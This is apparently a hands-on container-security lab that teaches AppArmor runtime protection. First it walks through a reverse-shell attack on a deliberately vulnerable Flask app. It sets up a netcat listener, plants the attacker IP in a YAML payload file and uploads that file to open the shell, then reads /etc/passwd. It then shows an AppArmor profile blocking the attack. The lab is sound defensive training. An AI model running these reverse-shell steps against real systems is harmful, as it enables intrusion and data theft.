## AppArmor - Runtime Protection for Container Workloads

1. Open Shell
2. Run: `cd /root/labs/container_training/Container/AppArmor`
3. Multiplex terminal session with tmux, run: `tmux`
4. Create and split panes horizontally `ctrl + b + Shift+"`
5. First, let's go to the lower panel and start netcat listener: 
    * `ctrl + b + (lower arrow key)`
    * run: `nc -l 1337`
6. Go to the upper pane with `ctrl + b + (upper arrow key)`
7. Run `docker run -d -p 5050:5050 abhaybhargav/vul_flask`
8. If you are on the Cloud Virtual Lab: you'll need to get the public IP Address of your server
    * Run `sed -i -e 's/Server_IP_Here/<IP>/g' reverse_shell.yml` substituting your `<IP>` with your public IP Address
9. else if you are on the VM, you'll need to get your IP from ifconfig and run: 
    * Run `sed -i -e 's/Server_IP_Here/<IP>/g' reverse_shell.yml` substituting your `<IP>` with your public IP Address
10. now when you run `cat reverse_shell.yml` you should see that your IP appears in the payload text
11. In the Upper Panel itself run the command to upload YAML file to to the server with: 
    `http --form POST http://localhost:5050/yaml_hammer file@reverse_shell.yml submit=submit`
12. If the command has successfully executed, you should have a reverse shell working in the lower panel. You can interact with this reverse tcp shell. You can run commands like `cat /etc/passwd`, `ls`, etc in the shell. You'll need to `ctrl + b + (lower arrow key)` to interact with the shell.
13. Now go back to the upper panel with `ctrl + b + (upper arrow key)` and run clean-docker. This will shut-down all existing docker containers and clean them up. This will also terminate your shell
14. Now run `apparmor_parser -r -W k8s-vul-flask-redis-armor` to load the apparmor profile to the localhost
15. Now run `docker run --rm -d -p 5050:5050 --security-opt apparmor=k8s-vul-flask-redis-armor abhaybhargav/vul_flask` 
16. Try and run step 11 again now and see what happens
17. Now run `docker ps` to get a list of running containers
    ```
    root@container-security-training-ubuntu:~/labs/container_training/Container/AppArmor# docker ps
    CONTAINER ID        IMAGE                    COMMAND             CREATED             STATUS              PORTS                    NAMES
    fc4e7ea5e6f3        abhaybhargav/vul_flask   "python app.py"     2 seconds ago       Up 1 second         0.0.0.0:5050->5050/tcp   clever_dubinsky
    ```
18. Copy the `CONTAINER_ID` in this case `fc4e7ea5e6f3`, please note that your ID may be different and run: 
    `docker exec -it <CONTAINER_ID> bash`. You should be in the shell environment of the container
19. Now try and run the following commands: 
    `cat /etc/passwd`
    `touch shell.py`
    `touch /tmp/shell.py`
    You should find that they don't work, only because we have enabled our runtime security profile with AppArmor
20. Bring down the tmux sessions with `ctrl + b + x` and click `y` on the prompt till you get back to the usual shell
21. Run `clean-docker` to clean up running and dangling containers